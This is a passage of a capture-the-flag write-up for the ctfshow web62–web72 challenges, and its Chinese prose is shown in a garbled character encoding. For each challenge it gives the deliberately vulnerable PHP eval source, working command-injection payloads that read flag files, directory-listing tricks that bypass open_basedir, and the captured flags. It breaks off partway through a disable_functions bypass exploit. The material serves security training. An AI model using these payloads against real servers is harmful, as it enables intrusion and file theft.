</code></pre><h2 id="web62"><a class="anchor" href="#web62">#</a> web62</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>payload:
c=include('flag.php');echo $flag;
</code></pre><pre><code>ctfshow&#123;9a7803c3-0788-40fd-8f01-fe77533d832c&#125;
</code></pre><h2 id="web63"><a class="anchor" href="#web63">#</a> web63</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>æ–°çŸ¥è¯†var_dump(get_defined_vars())	//è·å–æ‰€æœ‰æ³¨å†Œå˜é‡
payloadï¼š
c=include('flag.php');var_dump(get_defined_vars());
</code></pre><pre><code>ctfshow&#123;50fc64f3-422d-4eb5-a4fb-9a6be342966e&#125;
</code></pre><h2 id="web64"><a class="anchor" href="#web64">#</a> web64</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°ï¼ŒçœŸçš„æ˜¯ ç§€ä¸è¿‡ä½ ä»¬</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>payload:
c=include('flag.php');var_dump(get_defined_vars());

payload2:
c=highlight_file('flag.php');

payload3:
c=show_source('flag.php');
</code></pre><pre><code>ctfshow&#123;ba1dc4b3-3df1-4349-aec2-42f8b948ce91&#125;
</code></pre><h2 id="web65"><a class="anchor" href="#web65">#</a> web65</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°ï¼Œæ±‚ä½ ä»¬åˆ«ç§€äº†</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>åŒä¸Šç™½å«–payload
</code></pre><pre><code>ctfshow&#123;f07b04e9-ec66-475a-adaa-dcb71a4ee326&#125;
</code></pre><h2 id="web66"><a class="anchor" href="#web66">#</a> web66</h2><p>å‘½ä»¤æ‰§è¡Œï¼Œçªç ´ç¦ç”¨å‡½æ•°ï¼Œæ±‚ä½ ä»¬åˆ«ç§€äº†</p><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>æ–°è¿‡æ»¤äº†show_source()å‡½æ•°ã€‚

è¿™æ—¶æˆ‘ä»¬ç”¨highlight_file()å‡½æ•°æŸ¥çœ‹ï¼Œå‘ç°å¯èƒ½flagä¸åœ¨è¿™ä¸ªä½ç½®ï¼Œprint_r(scandir('.'))æŸ¥çœ‹flagæœ‰æ²¡æœ‰æ”¹åï¼Œå†æŸ¥çœ‹ä¸€ä¸‹æ ¹ç›®å½•ï¼Œå‘ç°æœ‰ä¸ªflag.txtæŸ¥çœ‹è®°å¾—å¾—åˆ°flag
</code></pre><pre><code>payload
c=highlight_file('/flag.txt');
</code></pre><pre><code>ctfshow&#123;10798615-2191-4957-89d5-336c633d6d3c&#125;
</code></pre><h2 id="web67"><a class="anchor" href="#web67">#</a> web67</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><pre><code>è¿‡æ»¤äº†print_rï¼Œé¢˜è§£è·Ÿä¸Šé¢˜ä¸€è‡´ï¼Œç”¨var_dump()å³å¯

payload:
c=highlight_file('/flag.txt');
</code></pre><pre><code>ctfshow&#123;623b27c5-a9ad-46dc-8d0c-3afb735cac76&#125;
</code></pre><h2 id="web68"><a class="anchor" href="#web68">#</a> web68</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre>Warning<span class="token punctuation">:</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span> has been disabled <span class="token keyword">for</span> security reasons in <span class="token operator">/</span><span class="token keyword">var</span><span class="token operator">/</span>www<span class="token operator">/</span>html<span class="token operator">/</span>index<span class="token operator">.</span><span class="token function">php</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token punctuation">)</span>'d code on line <span class="token number">1</span></pre></td></tr></table></figure><pre><code>ç›¸å½“äºhighlight_file()è¢«ç¦ç”¨äº†ï¼Œä½†å°è¯•åå‘ç°includeå’Œvar_dumpæ²¡æœ‰è¿‡æ»¤

payload:
c=var_dump(scandir('/'));	//å‘ç°flag.txt
c=include('/flag.txt');	//å› ä¸ºflag.txtæ²¡æœ‰phpå‰ç¼€ï¼Œæ‰€ä»¥ç›´æ¥å›æ˜¾å†…å®¹
</code></pre><pre><code>ctfshow&#123;64e1a348-7dd5-43a0-9f0e-922f00bc27a1&#125;
</code></pre><h2 id="web69"><a class="anchor" href="#web69">#</a> web69</h2><p>ç¦ç”¨äº† var_dump ()ï¼Œä½† payload å’Œä¸Šé¢˜åŒè§£ï¼Œé—®å°±æ˜¯çŒœçš„</p><h2 id="web70"><a class="anchor" href="#web70">#</a> web70</h2><p>payload å’Œä¸Šé¢˜åŒè§£ï¼Œé—®å°±æ˜¯çŒœçš„</p><h2 id="web71"><a class="anchor" href="#web71">#</a> web71</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>ä½ è¦ä¸Šå¤©å—ï¼Ÿ</pre></td></tr></table></figure><pre><code>è§£é¢˜æ€è·¯ï¼š
eval()å·²ç»æ‰§è¡Œç„¶åè®²ç»“æœæ›¿æ¢æˆé—®å·ï¼Œé‚£æˆ‘ä»¬å°±åœ¨evalæ‰§è¡Œå®Œåç»“æŸç¨‹åº

payloadï¼š
c=include('/flag.txt');exit();
</code></pre><pre><code>ctfshow&#123;2e525fc3-7391-4395-a9d4-45ce5f0a91c1&#125; 
</code></pre><h2 id="web72"><a class="anchor" href="#web72">#</a> web72</h2><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token php language-php"><span class="token delimiter important">&lt;?php</span></span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token comment">/*</span></pre></td></tr><tr><td data-num="4"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num="5"></td><td><pre># @Author: Lazzaro</pre></td></tr><tr><td data-num="6"></td><td><pre># @Date:   2020-09-05 20:49:30</pre></td></tr><tr><td data-num="7"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num="8"></td><td><pre># @Last Modified time: 2020-09-07 22:02:47</pre></td></tr><tr><td data-num="9"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num="10"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>*/</pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token comment">// ä½ ä»¬åœ¨ç‚«æŠ€å—ï¼Ÿ</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="26"></td><td><pre></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token delimiter important">?></span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>ä½ è¦ä¸Šå¤©å—ï¼Ÿ</pre></td></tr></table></figure><pre><code>å­˜åœ¨open_basedirï¼Œåˆ©ç”¨globä¼ªåè®®åœ¨ç­›é€‰ç›®å½•æ—¶ä¸å—open_basediråˆ¶çº¦
</code></pre><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// æ­¤è„šæœ¬è·å–æ–‡ä»¶å</span></pre></td></tr><tr><td data-num="2"></td><td><pre>c<span class="token operator">=</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token keyword">echo</span> <span class="token variable">$f</span><span class="token operator">.</span><span class="token string double-quoted-string">"    "</span> <span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="7"></td><td><pre> </pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr></table></figure><figure class="highlight php"><figcaption data-lang="PHP"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// æ­¤è„šæœ¬ç»•è¿‡ open_basedir å’Œ disable_functionsï¼ŒURL ç¼–ç å¾—åˆ°ç»“æœ</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">function</span> <span class="token function-definition function">ctfshow</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">global</span> <span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$helper</span><span class="token punctuation">,</span> <span class="token variable">$backtrace</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Vuln</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token 